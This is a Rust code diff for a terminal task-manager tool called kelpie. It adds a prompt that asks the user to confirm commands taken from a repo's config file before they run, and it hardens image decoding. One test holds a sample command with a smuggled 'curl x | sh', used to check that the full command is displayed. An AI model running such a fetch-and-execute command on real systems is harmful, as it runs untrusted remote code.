@@ -173,10 +173,16 @@ enum Mode {
     ConfirmDrop { path: PathBuf, name: String, force: bool },
     ConfirmReset { path: PathBuf, name: String },
     ConfirmPush { path: PathBuf, commits: Vec<tasks::Commit>, selected: usize, card: Option<(report::Card, bool)> },
+    ConfirmCommand { repo: PathBuf, command: String, what: &'static str, then: Box<Then> },
     EditMessage(Box<MessageEditor>),
     Working { label: String, result: Receiver<Result<String>> },
     Questions(Box<QuestionWindow>),
     Help,
+}
+
+enum Then {
+    Toggle(Box<Item>, Process),
+    Start { repo: PathBuf, name: String, prompt: Option<String>, backlog: Option<String> },
 }
 
 #[derive(Clone, Copy, PartialEq, Debug)]
@@ -411,6 +417,9 @@ struct App {
     asked_details: HashMap<PathBuf, Instant>,
     graphics: Graphics,
     images: HashMap<(PathBuf, u16), Option<Protocol>>,
+    decoded: HashMap<PathBuf, Option<image::DynamicImage>>,
+    image_requests: Option<Sender<PathBuf>>,
+    image_results: Option<Receiver<Decoded>>,
     plans: HashMap<String, Text<'static>>,
     updates: Vec<(String, String)>,
     updater: Updater,
@@ -647,6 +656,38 @@ fn spawn_detailer() -> (Sender<DetailRequest>, Receiver<(PathBuf, Detail)>) {
     (request_tx, detail_rx)
 }
 
+const IMAGE_BYTES: u64 = 20 * 1024 * 1024;
+
+// A card names whatever file its task chose, so it is decoded here, capped in size, and a decoder that panics costs the image only.
+fn decode_image(path: &Path) -> Option<image::DynamicImage> {
+    if std::fs::metadata(path).ok()?.len() > IMAGE_BYTES {
+        return None;
+    }
+    let mut reader = image::ImageReader::open(path).ok()?.with_guessed_format().ok()?;
+    let mut limits = image::Limits::default();
+    limits.max_image_width = Some(8192);
+    limits.max_image_height = Some(8192);
+    limits.max_alloc = Some(256 * 1024 * 1024);
+    reader.limits(limits);
+    std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| reader.decode().ok())).ok().flatten()
+}
+
+type Decoded = (PathBuf, Option<image::DynamicImage>);
+
+fn spawn_decoder() -> Option<(Sender<PathBuf>, Receiver<Decoded>)> {
+    let (request_tx, request_rx) = mpsc::channel::<PathBuf>();
+    let (image_tx, image_rx) = mpsc::channel();
+    thread::Builder::new().name("kelpie-images".to_string()).spawn(move || {
+        while let Ok(path) = request_rx.recv() {
+            let decoded = decode_image(&path);
+            if image_tx.send((path, decoded)).is_err() {
+                return;
+            }
+        }
+    }).ok()?;
+    Some((request_tx, image_rx))
+}
+
 fn gather_detail(path: &Path, repo: Option<&Path>) -> Detail {
     let settings = repo.and_then(|repo| config::resolve(Some(repo)).ok()).map(|resolved| resolved.settings);
     let changed = repo::git(path, &["status", "--porcelain"]).unwrap_or_default().lines()
@@ -705,9 +746,13 @@ impl Process {
     }
 
     fn command(self, settings: &config::Settings) -> Option<String> {
+        self.setting(settings).value.clone()
+    }
+
+    fn setting(self, settings: &config::Settings) -> &config::Setting<Option<String>> {
         match self {
-            Process::Server => settings.dev_server.value.clone(),
-            Process::Worker => settings.dev_worker.value.clone(),
+            Process::Server => &settings.dev_server,
+            Process::Worker => &settings.dev_worker,
         }
     }
 }
@@ -805,11 +850,25 @@ impl App {
         let Graphics::Ready(picker) = &self.graphics else { return None };
         let key = (path.to_path_buf(), width);
         if !self.images.contains_key(&key) {
-            let decoded = image::ImageReader::open(path).ok().and_then(|reader| reader.with_guessed_format().ok()).and_then(|reader| reader.decode().ok());
-            let protocol = decoded.and_then(|decoded| picker.new_protocol(decoded, ratatui::layout::Size::new(width, 14), Resize::Fit(None)).ok());
+            let Some(decoded) = self.decoded.get(path) else {
+                if let Some(requests) = &self.image_requests {
+                    let _ = requests.send(path.to_path_buf());
+                }
+                self.decoded.insert(path.to_path_buf(), None);
+                return None;
+            };
+            let protocol = decoded.clone().and_then(|decoded| picker.new_protocol(decoded, ratatui::layout::Size::new(width, 14), Resize::Fit(None)).ok());
             self.images.insert(key.clone(), protocol);
         }
         self.images.get(&key)?.as_ref().map(|protocol| protocol.size().height)
+    }
+
+    fn take_images(&mut self) {
+        let Some(results) = &self.image_results else { return };
+        while let Ok((path, decoded)) = results.try_recv() {
+            self.images.retain(|(drawn, _), _| *drawn != path);
+            self.decoded.insert(path, decoded);
+        }
     }
 
     fn backlog_len(&self) -> usize {
@@ -1067,6 +1126,21 @@ impl App {
             Mode::Help | Mode::Message(_) => {}
             working @ Mode::Working { .. } => self.mode = working,
             Mode::Questions(window) => self.handle_questions(window, key),
+            Mode::ConfirmCommand { repo, command, then, .. } => {
+                let yes = key.code == KeyCode::Char('y');
+                if yes && let Err(error) = config::confirm_command(&repo, &command) {
+                    self.show(Err(error));
+                    return;
+                }
+                match *then {
+                    Then::Toggle(item, process) if yes => self.toggle(&item, process),
+                    Then::Toggle(..) => {}
+                    Then::Start { repo, name, prompt, backlog } => {
+                        let result = start_in_background(&repo, &name, prompt.as_deref(), backlog.as_deref());
+                        self.show(result.map(|started| if yes { started } else { format!("{started} Its Claude is not told the repo's setup command.") }));
+                    }
+                }
+            }
             Mode::ConfirmReset { path, .. } => {
                 if key.code == KeyCode::Char('y') {
                     self.in_background("Resetting the task…".to_string(), move || tasks::reset(&path, None));
@@ -1412,6 +1486,14 @@ impl App {
         }
     }
 
+    fn start_confirmed(&mut self, repo: PathBuf, name: String, prompt: Option<String>, backlog: Option<String>) {
+        let setup = config::resolve(Some(&repo)).ok().and_then(|loaded| config::unconfirmed(&loaded.settings.setup_command, &repo));
+        match setup {
+            Some(command) => self.mode = Mode::ConfirmCommand { repo: repo.clone(), command, what: "worktree.setup_command", then: Box::new(Then::Start { repo, name, prompt, backlog }) },
+            None => self.show(start_in_background(&repo, &name, prompt.as_deref(), backlog.as_deref())),
+        }
+    }
+
     // Each process runs in a tab of the Space named after it; stopping it is ctrl-c to that tab.
     fn toggle(&mut self, item: &Item, process: Process) {
         let (Some(workspace), Some(path)) = (&item.workspace, &item.path) else {
@@ -1425,7 +1507,12 @@ impl App {
         };
         let tab = process.tab(settings.as_ref());
         let tab = tab.as_str();
-        let result = match busy_tab_pane(workspace, tab) {
+        let busy = busy_tab_pane(workspace, tab);
+        if busy.is_none() && let (Some(repo), Some(settings)) = (&item.repo, &settings) && let Some(command) = config::unconfirmed(process.setting(settings), repo) {
+            self.mode = Mode::ConfirmCommand { repo: repo.clone(), command, what: process.key(), then: Box::new(Then::Toggle(Box::new(item.clone()), process)) };
+            return;
+        }
+        let result = match busy {
             Some(pane) => herdr::send_keys(&pane, &["ctrl+c"]).map(|_| format!("Stopping {} in {}.", process.noun(), item.name)),
             None => {
                 let port = repo::worktree_port(path);
@@ -1488,14 +1575,15 @@ impl App {
             Purpose::TaskPrompt(name) => {
                 let repo = self.any_repo();
                 let prompt = (!text.is_empty()).then_some(text);
-                self.show(start_in_background(&repo, &name, prompt.as_deref(), None));
+                self.start_confirmed(repo, name, prompt, None);
             }
             Purpose::BacklogName(entry) => {
                 let prompt = backlog::task_prompt(&entry, &self.sources, crate::vault_cli::known_on());
                 let known = self.repo_named(&entry.area);
-                let result = known.map_or_else(|| outside(terminal, || repo::locate(&entry.area)), Ok)
-                    .and_then(|repo| start_in_background(&repo, &text, Some(&prompt), Some(&entry.reference)));
-                self.show(result);
+                match known.map_or_else(|| outside(terminal, || repo::locate(&entry.area)), Ok) {
+                    Ok(repo) => self.start_confirmed(repo, text, Some(prompt), Some(entry.reference.clone())),
+                    Err(error) => self.show(Err(error)),
+                }
             }
             Purpose::Tidy(path) => {
                 let result = tasks::tidy(&path, None, &text);
@@ -1513,9 +1601,9 @@ impl App {
 // The board stays where it is while the task's worktree and Claude come up; the task shows under Work once its Space exists.
 fn start_in_background(repo: &Path, name: &str, prompt: Option<&str>, backlog: Option<&str>) -> Result<String> {
     let dir = crate::lead::state_dir()?.join("starts");
-    std::fs::create_dir_all(&dir).map_err(|error| error.to_string())?;
+    crate::state::private_dir(&dir)?;
     let log = dir.join(format!("{}.log", name.replace('/', "-")));
-    let output = std::fs::File::create(&log).map_err(|error| format!("{}: {error}", log.display()))?;
+    let output = crate::state::create(&log).map_err(|error| format!("{}: {error}", log.display()))?;
     let errors = output.try_clone().map_err(|error| error.to_string())?;
     let mut command = Command::new(std::env::current_exe().map_err(|error| error.to_string())?);
     command.arg("-C").arg(repo).args(["start", name, "--no-focus"]);
@@ -2378,7 +2466,7 @@ fn fold_from(saved: &str, height: u16) -> (Fold, u64) {
 
 fn save_fold(file: Option<&Path>, fold: Fold, seen: u64) {
     if let Some(file) = file {
-        let _ = std::fs::write(file, format!("{}\t{seen}\n", fold.name()));
+        let _ = crate::state::write(file, format!("{}\t{seen}\n", fold.name()));
     }
 }
 
@@ -2748,6 +2836,19 @@ fn draw(frame: &mut Frame, app: &mut App) {
             lines.push(Line::from(Span::styled("any key to close", style(MUTED))));
             modal(frame, "kelpie".to_string(), lines, 96);
         }
+        Mode::ConfirmCommand { repo, command, what, then } => {
+            let answer = match then.as_ref() {
+                Then::Toggle(..) => "Run it?  y / n",
+                Then::Start { .. } => "Tell the task to run it?  y / n (n starts the task without it)",
+            };
+            modal(frame, "confirm".to_string(), vec![
+                Line::from(Span::styled(format!("{}'s {} sets {what} to", repo::name_of(repo), config::REPO_FILE), style(MUTED))),
+                Line::from(Span::styled(command.clone(), style(TEXT))),
+                Line::default(),
+                Line::from(Span::styled("It runs as you. kelpie asks again whenever the repo changes it.", style(MUTED))),
+                Line::from(Span::styled(answer, style(YELLOW))),
+            ], 96);
+        }
         Mode::ConfirmReset { name, .. } => {
             modal(frame, "reset".to_string(), vec![
                 Line::from(Span::styled(name.clone(), style(TEXT))),
@@ -2928,7 +3029,7 @@ impl App {
             page: Page::Work, areas: area_page::Page::new(sources.clone()), sources, fetch_failures: Vec::new(), away: false,
             messages: Vec::new(), fold: Fold::Line, seen: 0, fold_file: None, in_messages: false, message_back: 0, questions: Vec::new(), usage: None, ongoing: Vec::new(),
             details: HashMap::new(), detail_requests: None, detail_results: None, asked_details: HashMap::new(),
-            graphics: Graphics::Off, images: HashMap::new(), plans: HashMap::new(),
+            graphics: Graphics::Off, images: HashMap::new(), decoded: HashMap::new(), image_requests: None, image_results: None, plans: HashMap::new(),
             updates: Vec::new(), updater: std::sync::Arc::new(|| update::run(&crate::doctor::Env::current().claude_dir, false)), update_running: false, update_shown: false, recheck: None,
         }
     }
@@ -2953,6 +3054,7 @@ pub fn run(overlay: bool) -> Result<String> {
     let (requests, results) = spawn_detailer();
     app.detail_requests = Some(requests);
     app.detail_results = Some(results);
+    (app.image_requests, app.image_results) = spawn_decoder().map_or((None, None), |(requests, results)| (Some(requests), Some(results)));
     let height = ratatui::crossterm::terminal::size().map_or(50, |(_, height)| height);
     app.fold_file = fold_file();
     (app.fold, app.seen) = load_fold(app.fold_file.as_deref(), height);
@@ -3029,6 +3131,7 @@ pub fn run(overlay: bool) -> Result<String> {
                     app.details.insert(path, std::rc::Rc::new(detail));
                 }
             }
+            app.take_images();
             if app.page == Page::Areas {
                 app.areas.tick();
             }
@@ -3349,6 +3452,18 @@ mod tests {
     }
 
     #[test]
+    fn a_command_from_a_repos_own_file_is_shown_in_full_before_it_runs() {
+        let mut app = test_app(vec![served("search-filters")]);
+        let item = app.tasks[0].clone();
+        app.mode = Mode::ConfirmCommand { repo: PathBuf::from("/work/web"), command: "npm run dev; curl x | sh".to_string(), what: Process::Server.key(), then: Box::new(Then::Toggle(Box::new(item), Process::Server)) };
+        let screen = render(&mut app, 120, 30).0.join("\n");
+        assert!(screen.contains("web's .kelpie.toml sets worktree.dev_server to") && screen.contains("npm run dev; curl x | sh") && screen.contains("Run it?  y / n"), "{screen}");
+        app.mode = Mode::ConfirmCommand { repo: PathBuf::from("/work/web"), command: "/bin/sh -c x".to_string(), what: "worktree.setup_command", then: Box::new(Then::Start { repo: PathBuf::from("/work/web"), name: "x".to_string(), prompt: None, backlog: None }) };
+        let screen = render(&mut app, 120, 30).0.join("\n");
+        assert!(screen.contains("/bin/sh -c x") && screen.contains("n starts the task without it"), "{screen}");
+    }
+
+    #[test]
     fn at_170_columns_the_selected_task_has_a_detail_panel_between_work_and_backlog_and_its_link_only_there() {
         let mut app = test_app(vec![served("search-filters"), crate::status::tests::task(Some("working"), None, 0)]);
         with_detail(&mut app);
@@ -3660,11 +3775,33 @@ mod tests {
         let screen = rows.join("\n");
         assert!(screen.contains(&format!("▣ {}  after", png.display())) && screen.contains("▣ /nowhere/before.png  before"), "{screen}");
         app.graphics = Graphics::Ready(Picker::halfblocks());
+        (app.image_requests, app.image_results) = spawn_decoder().map(|(requests, results)| (Some(requests), Some(results))).unwrap();
+        let (rows, _) = render(&mut app, 170, 50);
+        assert!(rows.join("\n").contains(&format!("▣ {}  after", png.display())), "the path shows while the image decodes off the drawing thread");
+        let waited = Instant::now();
+        while app.decoded.get(&png).is_none_or(Option::is_none) && waited.elapsed() < Duration::from_secs(5) {
+            thread::sleep(Duration::from_millis(10));
+            app.take_images();
+        }
         let (rows, buffer) = render(&mut app, 170, 50);
         let (_, y) = find(&rows, "  after")[0];
         let red = Color::Rgb(200, 30, 30);
         assert!((0..170).any(|x| buffer[(x, y as u16 + 1)].bg == red || buffer[(x, y as u16 + 1)].fg == red), "the image under its line: {}", rows.join("\n"));
         assert!(rows.join("\n").contains("▣ /nowhere/before.png  before"), "a missing file stays a path");
+        std::fs::remove_dir_all(dir).unwrap();
+    }
+
+    #[test]
+    fn an_image_too_large_or_not_an_image_is_not_decoded() {
+        let dir = std::env::temp_dir().join(format!("kelpie-decode-{}", std::process::id()));
+        std::fs::create_dir_all(&dir).unwrap();
+        let fake = dir.join("fake.png");
+        std::fs::write(&fake, b"\x89PNG\r\n\x1a\nnot really").unwrap();
+        assert!(decode_image(&fake).is_none());
+        let big = dir.join("big.png");
+        std::fs::File::create(&big).unwrap().set_len(IMAGE_BYTES + 1).unwrap();
+        assert!(decode_image(&big).is_none());
+        assert!(decode_image(&dir.join("missing.png")).is_none());
         std::fs::remove_dir_all(dir).unwrap();
     }
 
